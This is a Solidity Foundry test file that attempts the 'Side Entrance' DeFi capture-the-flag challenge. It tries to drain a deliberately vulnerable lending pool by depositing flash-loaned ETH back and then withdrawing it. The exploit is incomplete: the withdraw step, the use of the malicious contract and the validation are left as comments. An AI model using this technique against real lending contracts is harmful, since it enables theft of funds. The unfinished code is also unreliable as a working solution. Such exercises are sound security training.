// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";
import {MaliciousContract} from "../src/MaliciousContract.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    // MaliciousContract internal maliciousContract;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        // maliciousContract = new MaliciousContract();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function execute() external payable {
        // Deposit the borrowed ETH back into the lending pool
        sideEntranceLenderPool.deposit{value: msg.value}();

        // Withdraw all ETH from the lending pool
    }

    function testExploit() external {
        /**
         * EXPLOIT START *
         */

        MaliciousContract maliciousContract = new MaliciousContract(
            attacker,
            address(sideEntranceLenderPool)
        );
        // execute();

        sideEntranceLenderPool.flashLoan(1 ether);

        /**
         * EXPLOIT END *
         */

        // validation();
        console.log(unicode"\n🎉 Congratulations");
    }

    function withdraw() external {
        sideEntranceLenderPool.withdraw();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
